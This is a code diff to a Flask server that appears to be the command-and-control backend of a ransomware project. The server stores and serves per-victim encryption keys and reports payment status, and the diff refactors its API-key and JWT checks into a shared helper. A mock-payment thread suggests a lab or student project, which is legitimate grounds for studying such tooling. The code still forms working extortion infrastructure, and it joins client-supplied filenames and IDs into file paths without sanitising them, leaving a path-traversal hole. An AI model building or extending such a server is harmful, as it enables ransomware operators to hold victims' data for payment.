@@ -14,6 +14,7 @@ import random
 from C2_Variables import DB_PATH, KEY_STORAGE_DIR, api_key, seconds_left, jwt_key
 from Threading import start_mock_payment, start_remove_expired_keys
 from Database import init_db
+from Validation import check_keys
 
 
 ####################################################################################################################
@@ -63,25 +64,18 @@ def create_jwt_session():
 
 ####################################################################################################################
 
-@app.route('/upload_key', methods=['POST'])
+@app.route('/upload_key', methods=['POST']) # NEED TO SECURE THIS RIGHT NOW IT CAN GET ABUSED
 def upload_key():
+
     received_api_key = request.headers.get('API-KEY')
-    if received_api_key != api_key:
-        return jsonify({"error": "Invalid API Key"}), 403
+    session_token = request.headers.get('Session-Token')
+    validation_failed = check_keys(received_api_key, session_token)
+    if validation_failed:
+        return validation_failed
+
     key_file = request.files.get('key')
     if not key_file:
         return jsonify({"error": "No key provided"}), 400 # Debug Message
-    
-    session_token = request.headers.get('Session-Token')
-    if not session_token:
-        return jsonify({"error": "Missing session token"}), 401
-
-    try:
-        payload = jwt.decode(session_token, jwt_key, algorithms=["HS256"])
-    except jwt.ExpiredSignatureError:
-        return jsonify({"error": "Session token expired"}), 401
-    except jwt.InvalidTokenError:
-        return jsonify({"error": "Invalid session token"}), 401
 
     key_filename = key_file.filename
     key_path = os.path.join(KEY_STORAGE_DIR, key_filename)
@@ -104,19 +98,10 @@ def upload_key():
 @app.route('/get_key/<unique_id>', methods=['GET'])
 def get_key(unique_id):
     received_api_key = request.headers.get('API-KEY')
-    if received_api_key != api_key:
-        return jsonify({"error": "Invalid API Key"}), 403
-    
     session_token = request.headers.get('Session-Token')
-    if not session_token:
-        return jsonify({"error": "Missing session token"}), 401
-
-    try:
-        payload = jwt.decode(session_token, jwt_key, algorithms=["HS256"])
-    except jwt.ExpiredSignatureError:
-        return jsonify({"error": "Session token expired"}), 401
-    except jwt.InvalidTokenError:
-        return jsonify({"error": "Invalid session token"}), 401
+    validation_failed = check_keys(received_api_key, session_token)
+    if validation_failed:
+        return validation_failed
     
     key_path = os.path.join(KEY_STORAGE_DIR, unique_id)
 
@@ -138,19 +123,10 @@ def get_key(unique_id):
 @app.route('/payment_status/<unique_id>', methods=['GET'])
 def payment_status(unique_id):
     received_api_key = request.headers.get('API-KEY')
-    if received_api_key != api_key:
-        return jsonify({"error": "Invalid API Key"}), 403
-    
     session_token = request.headers.get('Session-Token')
-    if not session_token:
-        return jsonify({"error": "Missing session token"}), 401
-
-    try:
-        payload = jwt.decode(session_token, jwt_key, algorithms=["HS256"])
-    except jwt.ExpiredSignatureError:
-        return jsonify({"error": "Session token expired"}), 401
-    except jwt.InvalidTokenError:
-        return jsonify({"error": "Invalid session token"}), 401
+    validation_failed = check_keys(received_api_key, session_token)
+    if validation_failed:
+        return validation_failed
 
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
